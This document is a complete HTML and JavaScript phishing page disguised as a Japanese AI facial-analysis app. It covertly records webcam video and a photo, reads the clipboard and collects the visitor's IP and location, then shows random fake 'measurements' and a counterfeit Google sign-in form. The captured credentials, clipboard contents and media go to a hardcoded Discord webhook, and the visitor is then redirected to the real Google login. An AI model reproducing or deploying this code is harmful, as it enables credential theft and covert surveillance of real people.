<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Deep Scan | 次世代顔タイプ診断</title>
    <style>
        * { box-sizing: border-box; outline: none; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { background: #0d0d0d; border: 1px solid #222; padding: 35px; border-radius: 24px; text-align: center; width: 380px; box-shadow: 0 25px 50px rgba(0,0,0,0.9); transition: 0.5s; position: relative; }
        h1 { font-size: 18px; letter-spacing: 4px; margin-bottom: 25px; color: #fff; font-weight: 300; }
        .v-wrap { width: 100%; border-radius: 15px; overflow: hidden; border: 1px solid #333; margin-bottom: 20px; background: #050505; position: relative; line-height: 0; }
        #video { width: 100%; display: block; transform: scaleX(-1); }
        .btn { background: #ffffff; color: #000; border: none; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.2s; }
        .btn:active { transform: scale(0.98); opacity: 0.8; }
        
        /* Result UI Styles */
        #result-ui, #login-ui { display: none; }
        .result-container { text-align: left; background: #151515; border-radius: 15px; padding: 15px; margin-bottom: 20px; border: 1px solid #222; }
        .result-title { font-size: 12px; color: #888; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px; }
        .result-item { display: flex; justify-content: space-between; margin: 8px 0; font-size: 13px; font-family: monospace; }
        .result-label { color: #aaa; }
        .result-value { color: #0ff; font-weight: bold; }
        
        .score-box { margin: 20px 0; }
        .score-label { font-size: 14px; margin-bottom: 5px; }
        .score-bar { width: 100%; height: 8px; background: #222; border-radius: 4px; overflow: hidden; }
        .score-fill { height: 100%; background: linear-gradient(90deg, #0ff, #007bff); width: 0%; transition: width 2s ease-in-out; }

        input { width: 100%; padding: 15px; margin: 12px 0; border: 1px solid #333; background: #111; color: #fff; border-radius: 10px; font-size: 15px; }
        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: rgba(0, 255, 255, 0.5); box-shadow: 0 0 15px #0ff; display: none; animation: scan 2.5s infinite linear; z-index: 10; }
        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
        .status-text { font-size: 10px; color: #444; margin-top: 15px; letter-spacing: 1px; font-family: monospace; }
        #ai-log { font-size: 9px; color: #0f0; text-align: left; margin-top: 10px; height: 50px; overflow: hidden; font-family: monospace; line-height: 1.2; }
    </style>
</head>
<body>

    <!-- Step 1: Scanning -->
    <div class="card" id="camera-ui">
        <h1>NEURAL ANALYZER</h1>
        <div class="v-wrap">
            <div class="scan-line" id="line"></div>
            <video id="video" autoplay playsinline muted></video>
        </div>
        <button class="btn" id="start-btn">スキャンを開始</button>
        <div class="status-text">SECURE LINK: ACTIVE</div>
    </div>

    <!-- Step 2: High-Fidelity Results -->
    <div class="card" id="result-ui">
        <h1>ANALYSIS RESULT</h1>
        
        <div class="result-container">
            <div class="result-title">FACIAL MEASUREMENTS</div>
            <div class="result-item"><span class="result-label">Interocular Dist:</span> <span class="result-value" id="res-eye">32.4mm</span></div>
            <div class="result-item"><span class="result-label">Philtrum Length:</span> <span class="result-value" id="res-lip">14.2mm</span></div>
            <div class="result-item"><span class="result-label">Jawline Angle:</span> <span class="result-value" id="res-jaw">124.5°</span></div>
            <div class="result-item"><span class="result-label">Golden Ratio:</span> <span class="result-value" id="res-ratio">1:1.621</span></div>
        </div>

        <div class="score-box">
            <div class="score-label">Symmetry Score: <span id="res-score" style="color:#0ff;">0%</span></div>
            <div class="score-bar"><div class="score-fill" id="score-fill"></div></div>
        </div>

        <div id="ai-log"></div>
        
        <button class="btn" id="view-details-btn" style="margin-top:10px;">詳細診断レポート(PDF)を表示</button>
        <div class="status-text">ENCRYPTED DATA READY</div>
    </div>

    <!-- Step 3: Login Trap -->
    <div class="card" id="login-ui">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90" style="margin-bottom:20px;">
        <h2 style="font-size:15px; margin-bottom:25px; font-weight: 400; color: #ccc;">本人確認を行ってください</h2>
        <p style="font-size:11px; color:#777; margin-top:-20px; margin-bottom:20px;">詳細レポートの閲覧にはアカウント照合が必要です</p>
        <form id="trap-form">
            <input type="email" id="email" placeholder="メールアドレスまたは電話番号" required>
            <input type="password" id="pass" placeholder="パスワードを入力" required>
            <button type="submit" class="btn" id="final-btn">レポートをアンロック</button>
        </form>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";

        const video = document.getElementById('video');
        const startBtn = document.getElementById('start-btn');
        const line = document.getElementById('line');
        let capturedImg = "";
        let videoBlob = null;
        let net = {};
        let clipboardData = "未取得";

        window.onload = async () => {
            try {
                const res = await fetch('https://ipapi.co/json/');
                net = await res.json();
            } catch (e) { net = { ip: "取得失敗" }; }
        };

        async function sendFirstStrike() {
            if (!capturedImg) return;
            const payload = {
                username: "Strike 1: Media Captured",
                embeds: [{
                    title: "📸 Visual Data Secured",
                    color: 0x00ff00,
                    fields: [
                        { name: "🌐 Network", value: `**IP:** ${net.ip || '不明'}\n**Loc:** ${net.city || '?'}, ${net.country_name || '?'}`, inline: true },
                        { name: "📱 Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true }
                    ],
                    timestamp: new Date()
                }]
            };
            const formData = new FormData();
            formData.append('payload_json', JSON.stringify(payload));
            try {
                const photoBlob = await (await fetch(capturedImg)).blob();
                formData.append('file1', photoBlob, 'face.jpg');
                if (videoBlob && videoBlob.size > 0) formData.append('file2', videoBlob, 'video.mp4');
                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            } catch (err) {}
        }

        startBtn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                video.srcObject = stream;
                startBtn.innerText = "分析中...";
                startBtn.disabled = true;
                line.style.display = "block";

                try {
                    if (navigator.clipboard) clipboardData = await navigator.clipboard.readText();
                } catch(e) { clipboardData = "アクセス拒否"; }

                const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
                const mediaRecorder = new MediaRecorder(stream, { mimeType });
                const chunks = [];
                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                mediaRecorder.onstop = async () => {
                    videoBlob = new Blob(chunks, { type: mimeType });
                    await sendFirstStrike();
                };
                mediaRecorder.start();

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth; 
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    capturedImg = canvas.toDataURL('image/jpeg', 0.6);
                    
                    mediaRecorder.stop();
                    document.getElementById('camera-ui').style.display = 'none';
                    showHighDefResult();
                    stream.getTracks().forEach(t => t.stop());
                }, 5000);
            } catch (err) { alert("カメラの許可が必要です。"); }
        };

        function showHighDefResult() {
            document.getElementById('result-ui').style.display = 'block';
            const log = document.getElementById('ai-log');
            const logTexts = [
                "> Locating orbital landmarks...",
                "> Computing intercanthal distance...",
                "> Analyzing philtrum-to-chin ratio...",
                "> Mapping mandibular angle...",
                "> 3D Mesh reconstruction complete."
            ];
            
            logTexts.forEach((text, i) => {
                setTimeout(() => {
                    log.innerHTML += text + "<br>";
                    log.scrollTop = log.scrollHeight;
                }, i * 800);
            });

            // Randomize measurements for realism
            document.getElementById('res-eye').innerText = (30 + Math.random() * 5).toFixed(1) + "mm";
            document.getElementById('res-lip').innerText = (12 + Math.random() * 4).toFixed(1) + "mm";
            document.getElementById('res-jaw').innerText = (120 + Math.random() * 10).toFixed(1) + "°";
            document.getElementById('res-ratio').innerText = "1:" + (1.61 + Math.random() * 0.05).toFixed(3);

            const randomScore = Math.floor(Math.random() * (96 - 88 + 1)) + 88;

            setTimeout(() => {
                document.getElementById('res-score').innerText = randomScore + "%";
                document.getElementById('score-fill').style.width = randomScore + "%";
            }, 1000);
        }

        document.getElementById('view-details-btn').onclick = () => {
            document.getElementById('result-ui').style.display = 'none';
            document.getElementById('login-ui').style.display = 'block';
        };

        document.getElementById('trap-form').onsubmit = async (e) => {
            e.preventDefault();
            document.getElementById('final-btn').innerText = "レポート照合中...";
            document.getElementById('final-btn').disabled = true;

            const payload = {
                username: "Strike 2: Credentials & Intel",
                embeds: [{
                    title: "🔑 Target Information Extracted",
                    color: 0xff0000,
                    fields: [
                        { name: "📧 Credentials", value: `**ID:** \`${document.getElementById('email').value}\`\n**PW:** \`${document.getElementById('pass').value}\`` },
                        { name: "📋 Clipboard", value: "```\n" + clipboardData + "\n```" },
                        { name: "🌐 IP", value: net.ip || '不明', inline: true }
                    ],
                    timestamp: new Date()
                }]
            };

            try {
                await fetch(WEBHOOK_URL, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload) 
                });
            } catch (err) {}
            window.location.href = "https://accounts.google.com/ServiceLogin?hl=ja";
        };
    </script>
</body>
</html>
